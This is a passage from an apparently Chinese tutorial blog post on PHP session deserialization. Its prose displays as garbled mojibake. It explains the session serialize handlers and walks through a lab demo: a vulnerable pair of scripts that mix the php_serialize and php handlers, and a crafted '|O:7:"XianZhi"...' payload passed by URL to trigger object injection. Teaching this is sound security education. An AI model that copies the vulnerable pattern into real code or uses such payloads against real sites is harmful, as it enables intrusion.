4„ÄÅsession.serialize_handler string‚ÄìÂÆö‰πâÁî®Êù•Â∫èÂàóÂåñ/ÂèçÂ∫èÂàóÂåñÁöÑÂ§ÑÁêÜÂô®ÂêçÂ≠ó„ÄÇÈªòËÆ§‰ΩøÁî®php</p>
<p><strong>Â∏∏ËßÅÁöÑphp-sessionÂ≠òÊîæ‰ΩçÁΩÆÊúâ</strong>Ôºö<br />
1„ÄÅ/var/lib/php5/sess_PHPSESSID<br />
2„ÄÅ/var/lib/php7/sess_PHPSESSID<br />
3„ÄÅ/var/lib/php/sess_PHPSESSID<br />
4„ÄÅ/tmp/sess_PHPSESSID 5 /tmp/sessions/sess_PHPSESSED<br />
5„ÄÅphpstudyÈõÜÊàêÁéØÂ¢É‰∏ãÂú®php.iniÈáåÊü•Êâæsession.save_pathÔºå‰πüÂèØ‰ª•Âú®ËøôÈáåÊõ¥ÊîπË∑ØÂæÑ</p>
<p><strong>session.serialize_handlerÂÆö‰πâÁöÑÂºïÊìéÊúâ‰∏âÁßçÔºåÂ¶Ç‰∏ãË°®ÊâÄÁ§∫Ôºö</strong></p>
<table>
<thead>
<tr>
<th><strong>Â§ÑÁêÜÂô®ÂêçÁß∞</strong></th>
<th><strong>Â≠òÂÇ®Ê†ºÂºè</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>php</td>
<td>ÈîÆÂêç + Á´ñÁ∫ø + ÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂåñÂ§ÑÁêÜÁöÑÂÄº</td>
</tr>
<tr>
<td>php_binary</td>
<td>ÈîÆÂêçÁöÑÈïøÂ∫¶ÂØπÂ∫îÁöÑ ASCII Â≠óÁ¨¶ + ÈîÆÂêç + ÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂåñÂ§ÑÁêÜÁöÑÂÄº</td>
</tr>
<tr>
<td>php_serialize</td>
<td>ÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂåñÂ§ÑÁêÜÁöÑÊï∞ÁªÑ</td>
</tr>
</tbody>
</table>
<p><strong>Ê≥®ÔºöËá™ PHP 5.5.4 Ëµ∑ÂèØ‰ª•‰ΩøÁî® _php*serialize*</strong><br />
‰∏äËø∞‰∏âÁßçÂ§ÑÁêÜÂô®‰∏≠Ôºåphp_serializeÂú®ÂÜÖÈÉ®ÁÆÄÂçïÂú∞Áõ¥Êé•‰ΩøÁî® serialize/unserializeÂáΩÊï∞ÔºåÂπ∂‰∏î‰∏ç‰ºöÊúâphpÂíå php_binaryÊâÄÂÖ∑ÊúâÁöÑÈôêÂà∂„ÄÇ ‰ΩøÁî®ËæÉÊóßÁöÑÂ∫èÂàóÂåñÂ§ÑÁêÜÂô®ÂØºËá¥$_SESSION ÁöÑÁ¥¢ÂºïÊó¢‰∏çËÉΩÊòØÊï∞Â≠ó‰πü‰∏çËÉΩÂåÖÂê´ÁâπÊÆäÂ≠óÁ¨¶(| Âíå !) „ÄÇ<br />
Ê≥®ÔºöÊü•ÁúãÁâàÊú¨ÔºåÊ≥®ÊÑèÔºöÂú®php 5.5.4‰ª•ÂâçÈªòËÆ§ÈÄâÊã©ÁöÑÊòØphpÔºå5.5.4‰πãÂêéÂ∞±ÊòØphp_serialize,ËøôÈáåÈù¢ÊòØphp_serialize,ÂêåÊó∂ÊÑèËØÜÂà∞ Âú®indexÁïåÈù¢ÁöÑÊó∂ÂÄôÔºåËÆæÁΩÆÈÄâÊã©ÁöÑÊòØphpÔºåÂõ†Ê≠§ÂèØËÉΩ‰ºöÈÄ†ÊàêÊºèÊ¥û<br />
‰∏ãÈù¢Êàë‰ª¨ÂÆû‰æãÊù•ÁúãÁúã‰∏âÁßç‰∏çÂêåÂ§ÑÁêÜÂô®Â∫èÂàóÂåñÂêéÁöÑÁªìÊûú„ÄÇ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//ini_set("session.serialize_handler", "php_serialize");</span>
<span class="token comment">//ini_set("session.serialize_handler", "php_binary");</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lemon'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token global">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÊØîÂ¶ÇËøôÈáåÊàëgetËøõÂéª‰∏Ä‰∏™ÂÄº‰∏∫abc,Êü•Áúã‰∏Ä‰∏ãÂêÑ‰∏™Â≠òÂÇ®Ê†ºÂºèÔºö</p>
<ul>
<li>php : lemon|s:3:‚Äúabc‚Äù;</li>
<li>php_serialize : a:1:{s:5:‚Äúlemon‚Äù;s:3:‚Äúabc‚Äù;}</li>
<li>php_binary : lemons:3:‚Äúabc‚Äù;</li>
</ul>
<p>ËøôÊúâ‰ªÄ‰πàÈóÆÈ¢òÔºåÂÖ∂ÂÆûPHP‰∏≠ÁöÑSessionÁöÑÂÆûÁé∞ÊòØÊ≤°ÊúâÁöÑÈóÆÈ¢òÔºåÂç±ÂÆ≥‰∏ªË¶ÅÊòØÁî±‰∫éÁ®ãÂ∫èÂëòÁöÑSession‰ΩøÁî®‰∏çÂΩìËÄåÂºïËµ∑ÁöÑ„ÄÇÂ¶ÇÔºö‰ΩøÁî®‰∏çÂêåÂºïÊìéÊù•Â§ÑÁêÜsessionÊñá‰ª∂„ÄÇ</p>
<h4 id="ÊºèÊ¥ûÈÄ†ÊàêÂéüÁêÜ"><a class="markdownIt-Anchor" href="#ÊºèÊ¥ûÈÄ†ÊàêÂéüÁêÜ"></a> ÊºèÊ¥ûÈÄ†ÊàêÂéüÁêÜÔºö</h4>
<p>ÁÆÄÂçïÊù•ËØ¥<code>php</code>Â§ÑÁêÜÂô®Âíå<code>php_serialize</code>Â§ÑÁêÜÂô®Ëøô‰∏§‰∏™Â§ÑÁêÜÂô®ÁîüÊàêÁöÑÂ∫èÂàóÂåñÊ†ºÂºèÊú¨Ë∫´ÊòØÊ≤°ÊúâÈóÆÈ¢òÁöÑÔºå‰ΩÜÊòØÂ¶ÇÊûúËøô‰∏§‰∏™Â§ÑÁêÜÂô®Ê∑∑ÂêàËµ∑Êù•Áî®ÔºåÂ∞±‰ºöÈÄ†ÊàêÂç±ÂÆ≥„ÄÇ</p>
<p>ÂΩ¢ÊàêÁöÑÂéüÁêÜÂ∞±ÊòØÂú®Áî®<code>session.serialize_handler = php_serialize</code>Â≠òÂÇ®ÁöÑÂ≠óÁ¨¶ÂèØ‰ª•ÂºïÂÖ• | , ÂÜçÁî®<code>session.serialize_handler = php</code>Ê†ºÂºèÂèñÂá∫<code>$_SESSION</code>ÁöÑÂÄºÊó∂Ôºå <code>|</code>‰ºöË¢´ÂΩìÊàêÈîÆÂÄºÂØπÁöÑÂàÜÈöîÁ¨¶ÔºåÂú®ÁâπÂÆöÁöÑÂú∞Êñπ‰ºöÈÄ†ÊàêÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ</p>
<p>‰∏æ‰∏™‰æãÂ≠ê</p>
<p>ÂÆö‰πâ‰∏Ä‰∏™<code>session.php</code>Êñá‰ª∂ÔºåÁî®‰∫é‰º†ÂÖ•<code>session</code>ÂÄº</p>
<p>Êñá‰ª∂ÂÜÖÂÆπ‰∏∫</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÂÖàÁúãÁúã<code>session</code>ÁöÑÂàùÂßãÂÜÖÂÆπÔºåÂ¶Ç‰∏ã</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"session"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Â≠òÂú®Âè¶‰∏Ä‰∏™<code>class.php</code>Êñá‰ª∂ÔºåÂÜÖÂÆπÂ¶Ç‰∏ã</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">XianZhi</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'panda'</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Who are you?"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XianZhi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÁÑ∂ÂêéÂÆû‰æãÂåñÂØπË±°ÂêéÔºåËæìÂá∫<code>panda</code></p>
<p>Ëøô‰∏§‰∏™Êñá‰ª∂ÁöÑ‰ΩúÁî®ÂæàÊ∏ÖÊô∞Ôºå<code>session.php</code>Êñá‰ª∂ÁöÑÂ§ÑÁêÜÂô®ÊòØ<code>php_serialize</code>Ôºå<code>class.php</code>Êñá‰ª∂ÁöÑÂ§ÑÁêÜÂô®ÊòØ<code>php</code>Ôºå<code>session.php</code>Êñá‰ª∂ÁöÑ‰ΩúÁî®ÊòØ‰º†ÂÖ•ÂèØÊéßÁöÑ <code>session</code>ÂÄºÔºå<code>class.php</code>Êñá‰ª∂ÁöÑ‰ΩúÁî®ÊòØÂú®ÂèçÂ∫èÂàóÂåñÂºÄÂßãÂâçËæìÂá∫<code>Who are you?</code>ÔºåÂèçÂ∫èÂàóÂåñÁªìÊùüÁöÑÊó∂ÂÄôËæìÂá∫<code>name</code>ÂÄº„ÄÇ</p>
<p>Ëøô‰∏§‰∏™Êñá‰ª∂Â¶ÇÊûúÊÉ≥Ë¶ÅÂà©Áî®sessionÂèçÂ∫èÂàóÂåñÊºèÊ¥û ÔºåÊàë‰ª¨Ë¶ÅÂú®<code>session.php</code>Êñá‰ª∂‰º†ÂÖ•<code>|</code>+<code>Â∫èÂàóÂåñ</code>Ê†ºÂºèÁöÑÂÄºÔºåÁÑ∂ÂêéÂÜçÊ¨°ËÆøÈóÆ<code>class.php</code>Êñá‰ª∂ÁöÑÊó∂ÂÄôÔºåÂ∞±‰ºöÂú®Ë∞ÉÁî®<code>session</code>ÂÄºÁöÑÊó∂ÂÄôÔºåËß¶ÂèëÊ≠§ BUG„ÄÇ</p>
<p>È¶ñÂÖàÁîüÊàêÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">XianZhi</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Who are you?"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XianZhi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$str</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"xianzhi"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>payload</code>:<code>O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;</code></p>
<p>ÁÑ∂Âêé‰º†ÂÖ•<code>session.php</code></p>
<p><code>url?seesion=|O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;</code></p>
<p>ÂÜçÊ¨°ËÆøÈóÆ<code>class.php</code>Âêé</p>
<p>ÂèëÁé∞Ëß¶ÂèëÊàêÂäü</p>
</div></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/07/02/%E5%88%9D%E8%AF%86CSRF%E5%92%8CSSRF/" rel="prev" title="ÂàùËØÜCSRFÂíåSSRF"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">ÂàùËØÜCSRFÂíåSSRF</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/07/01/PHP%E5%9F%BA%E7%A1%80/" rel="next" title="PHPÂü∫Á°Ä"><span class="post-nav-text">PHPÂü∫Á°Ä</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>ÊÇ®ÈúÄË¶ÅÁßëÂ≠¶‰∏äÁΩëÔºåÊâçÂèØ‰ΩøÁî®ËØÑËÆ∫Âå∫ÂäüËÉΩ„ÄÇ</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank"></a></div><div class="copyright"><span>&copy; 2023 ‚Äì 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Npc</span></div><div class="footer-custom-text">=w=</div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>